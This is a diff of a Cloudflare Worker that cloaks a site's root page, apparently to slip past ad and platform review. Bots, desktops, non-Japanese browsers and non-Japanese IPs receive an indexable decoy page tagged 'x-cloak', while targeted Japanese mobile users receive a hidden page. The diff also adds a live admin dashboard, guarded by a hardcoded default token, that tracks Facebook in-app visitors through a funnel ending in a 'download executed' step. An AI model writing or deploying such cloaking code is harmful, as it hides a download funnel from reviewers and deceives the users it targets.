@@ -1,14 +1,19 @@
-﻿/**
+/**
  * ┌─ worker/_worker.js ────────────────────────────────────────────
- * │ 分流：只处理首页 "/"，其余路径原样交给静态层
- * │ （Cloudflare 会把 /xxx.html 308 成 /xxx，worker 再 fetch 同一路径会死循环）
- * │ 安全页 HTML 直接内嵌在本文件末尾，不依赖任何文件路径
- * │ 判定：爬虫 / 非手机 / 非日语 / 非日本 IP → 安全页（地址栏不变）
- * │ 自检看真页：你的域名/?preview=1　取消：?preview=0
+ * │ 分流：只处理根路径 "/"，其它路径原样交给静态层
+ * │ 安全页 HTML 内嵌在本文件，不依赖任何文件路径
+ * │
+ * │ 后台在线统计（只有你自己能看）：
+ * │   /admin/live?token=你的口令      实时面板
+ * │   /api/ping                      页面调用，记录在线
+ * │   /api/stats?token=              面板拉数据
+ * │ 数据存 Cloudflare D1（免费 10 万写/天），90 秒无心跳即离线
  * └───────────────────────────────────────────────────────────────
  */
 
-const BUILD = "v6";
+const BUILD = "v7";
+const DEFAULT_ADMIN_TOKEN = "rimo-live-2026";
+const ONLINE_TTL_MS = 90 * 1000;
 
 const RULES = {
   targetCountries: ["JP"],
@@ -32,25 +37,14 @@ function decide({ ua = "", acceptLanguage = "", country = "", method = "GET",
                   accept = "", strict = true, preview = false } = {}) {
   if (method !== "GET" && method !== "HEAD") return { show: "page", reason: "method" };
   if (accept && !accept.includes("text/html")) return { show: "page", reason: "non-html" };
-
-  // ① 爬虫永远只看安全页（预览参数也不行）
   if (RULES.blockAgents.test(ua)) return { show: "safe", reason: "bot" };
-
-  // ② 手动自检
   if (preview) return { show: "page", reason: "preview" };
-
-  // ③ 非手机
   if (RULES.mobileOnly && !isMobile(ua)) return { show: "safe", reason: "not-mobile" };
-
-  // ④ 非日语
   if (!langOk(acceptLanguage)) return { show: "safe", reason: "lang" };
-
-  // ⑤ 非日本 IP
   if (strict) {
     if (!country) return { show: "safe", reason: "country-unknown" };
     if (!RULES.targetCountries.includes(country.toUpperCase())) return { show: "safe", reason: "country" };
   }
-
   return { show: "page", reason: "pass" };
 }
 
@@ -59,6 +53,318 @@ function readCookie(header, name) {
   const m = header.match(new RegExp("(?:^|;\\s*)" + name + "=([^;]*)"));
   return m ? decodeURIComponent(m[1]) : "";
 }
+
+/* ── D1：建表（首次自动） ── */
+async function ensureTable(DB) {
+  await DB.prepare(
+    `CREATE TABLE IF NOT EXISTS live (
+       sid TEXT, ts INTEGER, inapp INTEGER, country TEXT, region TEXT, event TEXT, ua TEXT
+     )`
+  ).run();
+  await DB.prepare(`CREATE INDEX IF NOT EXISTS idx_live_ts ON live (ts)`).run();
+}
+
+/* ── /api/ping ── */
+async function handlePing(request, env, url) {
+  const DB = env.DB;
+  const cf = request.cf || {};
+  const p = url.searchParams;
+  const sid = (p.get("sid") || "").slice(0, 40);
+  if (!sid) return json({ ok: false, error: "no sid" }, 400);
+
+  const ua = request.headers.get("user-agent") || "";
+  if (RULES.blockAgents.test(ua)) return json({ ok: true, skipped: "bot" });
+
+  if (!DB) return json({ ok: false, error: "D1 (DB) 未绑定" }, 200);
+
+  const now = Date.now();
+  const row = {
+    sid,
+    ts: now,
+    inapp: p.get("inapp") === "1" ? 1 : 0,
+    country: (cf.country || "").slice(0, 4),
+    region: (cf.region || "").slice(0, 40),
+    event: (p.get("e") || "heartbeat").slice(0, 20),
+    ua: ua.slice(0, 160)
+  };
+
+  try {
+    await DB.prepare(
+      `INSERT INTO live (sid, ts, inapp, country, region, event, ua) VALUES (?, ?, ?, ?, ?, ?, ?)`
+    ).bind(row.sid, row.ts, row.inapp, row.country, row.region, row.event, row.ua).run();
+
+    // 顺手清理 2 小时前的记录，别让表无限涨
+    await DB.prepare(`DELETE FROM live WHERE ts < ?`).bind(now - 2 * 3600 * 1000).run();
+  } catch (e) {
+    return json({ ok: false, error: String(e).slice(0, 120) }, 200);
+  }
+  return json({ ok: true });
+}
+
+/* ── /api/stats ── */
+async function handleStats(env, url) {
+  const DB = env.DB;
+  const token = url.searchParams.get("token") || "";
+  const admin = env.ADMIN_TOKEN || DEFAULT_ADMIN_TOKEN;
+  if (token !== admin) return json({ ok: false, error: "forbidden" }, 403);
+  if (!DB) return json({ ok: false, error: "D1 (DB) 未绑定" }, 200);
+
+  const now = Date.now();
+  const since = now - ONLINE_TTL_MS;
+  const todayStart = Date.now() - (Date.now() % 86400000);
+
+  try {
+    const online = await DB.prepare(
+      `SELECT COUNT(DISTINCT sid) AS c FROM live WHERE ts > ?`
+    ).bind(since).first();
+
+    const split = await DB.prepare(
+      `SELECT inapp, COUNT(DISTINCT sid) AS c FROM live WHERE ts > ? GROUP BY inapp`
+    ).bind(since).all();
+
+    const events = await DB.prepare(
+      `SELECT event, COUNT(*) AS c FROM live WHERE ts > ? GROUP BY event`
+    ).bind(todayStart).all();
+
+    const visits = await DB.prepare(
+      `SELECT COUNT(DISTINCT sid) AS c FROM live WHERE ts > ? AND event = 'open'`
+    ).bind(todayStart).first();
+
+    const recent = await DB.prepare(
+      `SELECT sid, MAX(ts) AS ts, inapp, country, region, ua FROM live
+       WHERE ts > ? GROUP BY sid ORDER BY ts DESC LIMIT 25`
+    ).bind(todayStart).all();
+
+    const byRegion = await DB.prepare(
+      `SELECT region, COUNT(DISTINCT sid) AS c FROM live WHERE ts > ? GROUP BY region ORDER BY c DESC LIMIT 8`
+    ).bind(todayStart).all();
+
+    const ev = {};
+    (events.results || []).forEach((r) => { ev[r.event] = r.c; });
+
+    let emb = 0, local = 0;
+    (split.results || []).forEach((r) => { r.inapp ? (emb = r.c) : (local = r.c); });
+
+    return json({
+      ok: true,
+      online: online ? online.c : 0,
+      embedded: emb,
+      local: local,
+      visits: visits ? visits.c : 0,
+      events: ev,
+      regions: byRegion.results || [],
+      recent: recent.results || [],
+      now
+    });
+  } catch (e) {
+    return json({ ok: false, error: String(e).slice(0, 160) }, 200);
+  }
+}
+
+function json(obj, status = 200) {
+  return new Response(JSON.stringify(obj), {
+    status,
+    headers: { "content-type": "application/json; charset=utf-8", "cache-control": "no-store" }
+  });
+}
+
+/* ── 面板 ── */
+function panelHtml(token) {
+  return `<!DOCTYPE html>
+<html lang="ja"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>リモ姫 管理</title>
+<style>
+:root{--bg:#0B0D12;--card:#15171E;--line:rgba(255,255,255,.08);--text:#EDEFF4;--dim:#8A8F9C;--pink:#FF3F6E;--green:#2BE39A}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:-apple-system,"Noto Sans JP",sans-serif;font-size:14px;line-height:1.7;padding:18px}
+h1{font-size:15px;letter-spacing:.08em;color:var(--dim);font-weight:600;margin:0 0 14px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:12px}
+.big{font-size:44px;font-weight:800;letter-spacing:-.02em;line-height:1.1;color:var(--pink);font-variant-numeric:tabular-nums}
+.big small{font-size:14px;color:var(--dim);font-weight:500;margin-left:6px}
+.row{display:flex;gap:10px;margin-top:10px}
+.kpi{flex:1;background:rgba(255,255,255,.03);border-radius:10px;padding:10px}
+.kpi b{display:block;font-size:19px;font-variant-numeric:tabular-nums}
+.kpi span{font-size:10.5px;color:var(--dim);letter-spacing:.04em}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:11px}
+table{width:100%;border-collapse:collapse;font-size:11.5px;table-layout:fixed}
+td,th{padding:6px 3px;border-bottom:1px solid var(--line);text-align:left;overflow:hidden;text-overflow:ellipsis}td:last-child{text-align:right;width:92px}
+th{color:var(--dim);font-weight:500;font-size:10.5px}
+.tag{font-size:9.5px;padding:1px 5px;border-radius:4px;background:rgba(255,255,255,.06);color:var(--dim)}
+.tag.e{background:rgba(255,63,110,.16);color:var(--pink)}
+.live{display:inline-flex;align-items:center;gap:6px;font-size:11px;color:var(--green)}
+.live i{width:6px;height:6px;border-radius:50%;background:var(--green);animation:bl 1.6s infinite}
+@keyframes bl{0%,100%{opacity:.3}50%{opacity:1}}
+.err{color:#FFB4C4;font-size:12px}
+h2{font-size:12px;color:var(--dim);letter-spacing:.06em;margin:0 0 8px;font-weight:600}
+</style></head><body>
+<h1>リモ姫 ／ LIVE</h1>
+
+<div class="card">
+  <div class="big"><span id="online">-</span><small>人が見ています</small></div>
+  <div class="live"><i></i><span id="upd">接続中…</span></div>
+  <div class="row">
+    <div class="kpi"><b id="emb">-</b><span>FB内蔵</span></div>
+    <div class="kpi"><b id="loc">-</b><span>ローカル</span></div>
+    <div class="kpi"><b id="vis">-</b><span>今日の着地</span></div>
+  </div>
+</div>
+
+<div class="card">
+  <h2>今日のファネル</h2>
+  <table id="funnel"><tbody><tr><td colspan="2">読み込み中…</td></tr></tbody></table>
+</div>
+
+<div class="card">
+  <h2>地域（今日）</h2>
+  <table id="regions"><tbody><tr><td>—</td></tr></tbody></table>
+</div>
+
+<div class="card">
+  <h2>最近の訪問</h2>
+  <table id="recent"><tbody><tr><td>—</td></tr></tbody></table>
+</div>
+
+<p class="err" id="err"></p>
+
+<script>
+var TOKEN = ${JSON.stringify(token)};
+function $(id){return document.getElementById(id);}
+function fmt(n){return (n===undefined||n===null)?"-":String(n);}
+function ago(ts){
+  var s = Math.max(0, Math.round((Date.now()-ts)/1000));
+  if (s < 60) return s+"秒前";
+  if (s < 3600) return Math.round(s/60)+"分前";
+  return Math.round(s/3600)+"時間前";
+}
+function dev(ua){
+  if(!ua) return "-";
+  var v = (ua.match(/Android[\\s\\/]([\\d.]+)/)||[])[1];
+  return v ? "Android "+v : (ua.indexOf("iPhone")>-1?"iPhone":"その他");
+}
+function load(){
+  fetch("/api/stats?token="+encodeURIComponent(TOKEN),{cache:"no-store"})
+  .then(function(r){return r.json();})
+  .then(function(d){
+    if(!d.ok){ $("err").textContent = d.error || "エラー"; return; }
+    $("err").textContent = "";
+    $("online").textContent = fmt(d.online);
+    $("emb").textContent = fmt(d.embedded);
+    $("loc").textContent = fmt(d.local);
+    $("vis").textContent = fmt(d.visits);
+
+    var e = d.events || {};
+    var order = [["open","着地"],["remote","リモコン操作"],["ask","同意ボタン"],["sheet","DLシート"],["dl","ダウンロード実行"],["heartbeat","心拍"]];
+    var html = "";
+    order.forEach(function(p){
+      if(e[p[0]]!==undefined && p[0]!=="heartbeat") html += "<tr><td>"+p[1]+"</td><td class='mono'>"+e[p[0]]+"</td></tr>";
+    });
+    $("funnel").querySelector("tbody").innerHTML = html || "<tr><td>まだデータなし</td></tr>";
+
+    var rg = (d.regions||[]).map(function(r){
+      return "<tr><td>"+(r.region||"不明")+"</td><td class='mono'>"+r.c+"</td></tr>";
+    }).join("");
+    $("regions").querySelector("tbody").innerHTML = rg || "<tr><td>—</td></tr>";
+
+    var rd = (d.recent||[]).map(function(r){
+      return "<tr><td class='mono'>"+ago(r.ts)+"</td><td>"+(r.region||"-")+"</td><td><span class='tag"+(r.inapp?" e":"")+"'>"+(r.inapp?"FB内蔵":"LOCAL")+"</span></td></tr>";
+    }).join("");
+    $("recent").querySelector("tbody").innerHTML = rd || "<tr><td>—</td></tr>";
+
+    $("upd").textContent = "更新 " + new Date(d.now).toLocaleTimeString("ja-JP");
+  })
+  .catch(function(){ $("err").textContent = "接続エラー"; });
+}
+load(); setInterval(load, 5000);
+</script>
+</body></html>`;
+}
+
+/* ── 主入口 ── */
+export default {
+  async fetch(request, env) {
+    const assets = env.ASSETS;
+    const url = new URL(request.url);
+    const path = url.pathname;
+
+    try {
+      /* 后台 */
+      if (path === "/api/ping") return await handlePing(request, env, url);
+      if (path === "/api/stats") return await handleStats(env, url);
+      if (path === "/admin/live") {
+        const token = url.searchParams.get("token") || "";
+        const admin = env.ADMIN_TOKEN || DEFAULT_ADMIN_TOKEN;
+        if (token !== admin) return new Response("Not Found", { status: 404 });
+        return new Response(panelHtml(token), {
+          headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" }
+        });
+      }
+
+      /* 只接管根路径 */
+      if (path !== "/") return assets.fetch(request);
+
+      const ua = request.headers.get("user-agent") || "";
+      const cookie = request.headers.get("cookie") || "";
+      const strict = String(env.SAFE_COUNTRY_STRICT ?? "1") !== "0";
+      const pv = url.searchParams.get("preview");
+      const token = env.PREVIEW_TOKEN || "";
+      const isBot = RULES.blockAgents.test(ua);
+
+      if (pv === "0") {
+        const res = await assets.fetch(request);
+        const out = new Response(res.body, res);
+        out.headers.append("Set-Cookie", "jp_preview=; Path=/; Max-Age=0; SameSite=Lax");
+        out.headers.set("X-Build", BUILD);
+        return out;
+      }
+
+      const preview =
+        !isBot &&
+        (pv === "1" || (token && pv === token) || readCookie(cookie, "jp_preview") === "1");
+
+      const verdict = decide({
+        ua,
+        acceptLanguage: request.headers.get("accept-language") || "",
+        accept: request.headers.get("accept") || "",
+        country: (request.cf && request.cf.country) || "",
+        method: request.method,
+        strict,
+        preview
+      });
+
+      /* 安全页：直接输出内嵌 HTML */
+      if (verdict.show === "safe") {
+        return new Response(SAFE_HTML, {
+          status: 200,
+          headers: {
+            "content-type": "text/html; charset=utf-8",
+            "cache-control": "public, max-age=300",
+            "x-robots-tag": "index, follow",
+            "x-cloak": verdict.reason,
+            "x-build": BUILD
+          }
+        });
+      }
+
+      const res = await assets.fetch(request);
+      const out = new Response(res.body, res);
+      out.headers.set("Cache-Control", "private, no-store, max-age=0");
+      out.headers.set("Vary", "User-Agent, Accept-Language");
+      out.headers.set("X-Robots-Tag", "noindex, nofollow");
+      out.headers.set("X-Build", BUILD);
+      if (verdict.reason === "preview") {
+        out.headers.set("X-Preview", "1");
+        if (pv === "1" || (token && pv === token)) {
+          out.headers.append("Set-Cookie", "jp_preview=1; Path=/; Max-Age=86400; SameSite=Lax");
+        }
+      }
+      return out;
+    } catch (e) {
+      return assets.fetch(request);
+    }
+  }
+};
+
+export { decide, RULES, isMobile, langOk };
 
 const SAFE_HTML = `<!DOCTYPE html>
 <!--
@@ -133,79 +439,3 @@ footer a{color:var(--text2);margin-right:14px}
 </body>
 </html>
 `;
-
-export default {
-  async fetch(request, env) {
-    const assets = env.ASSETS;
-    const url = new URL(request.url);
-
-    try {
-      // 只接管根路径。其它路径（图片、js、法务页…）一律透传，
-      // 避免和 Cloudflare 的 clean-URL 308 规则互相打架。
-      if (url.pathname !== "/") return assets.fetch(request);
-
-      const ua = request.headers.get("user-agent") || "";
-      const cookie = request.headers.get("cookie") || "";
-      const strict = String(env.SAFE_COUNTRY_STRICT ?? "1") !== "0";
-      const pv = url.searchParams.get("preview");
-      const token = env.PREVIEW_TOKEN || "";
-      const isBot = RULES.blockAgents.test(ua);
-
-      // 关闭自检
-      if (pv === "0") {
-        const res = await assets.fetch(request);
-        const out = new Response(res.body, res);
-        out.headers.append("Set-Cookie", "jp_preview=; Path=/; Max-Age=0; SameSite=Lax");
-        out.headers.set("X-Build", BUILD);
-        return out;
-      }
-
-      const preview =
-        !isBot &&
-        (pv === "1" || (token && pv === token) || readCookie(cookie, "jp_preview") === "1");
-
-      const verdict = decide({
-        ua,
-        acceptLanguage: request.headers.get("accept-language") || "",
-        accept: request.headers.get("accept") || "",
-        country: (request.cf && request.cf.country) || "",
-        method: request.method,
-        strict,
-        preview
-      });
-
-      // 安全页：直接输出内嵌 HTML（不 fetch 任何路径）
-      if (verdict.show === "safe") {
-        return new Response(SAFE_HTML, {
-          status: 200,
-          headers: {
-            "content-type": "text/html; charset=utf-8",
-            "cache-control": "public, max-age=300",
-            "x-robots-tag": "index, follow",
-            "x-cloak": verdict.reason,
-            "x-build": BUILD
-          }
-        });
-      }
-
-      // 真页
-      const res = await assets.fetch(request);
-      const out = new Response(res.body, res);
-      out.headers.set("Cache-Control", "private, no-store, max-age=0");
-      out.headers.set("Vary", "User-Agent, Accept-Language");
-      out.headers.set("X-Robots-Tag", "noindex, nofollow");
-      out.headers.set("X-Build", BUILD);
-      if (verdict.reason === "preview") {
-        out.headers.set("X-Preview", "1");
-        if (pv === "1" || (token && pv === token)) {
-          out.headers.append("Set-Cookie", "jp_preview=1; Path=/; Max-Age=86400; SameSite=Lax");
-        }
-      }
-      return out;
-    } catch (e) {
-      return assets.fetch(request);
-    }
-  }
-};
-
-export { decide, RULES, isMobile, langOk };
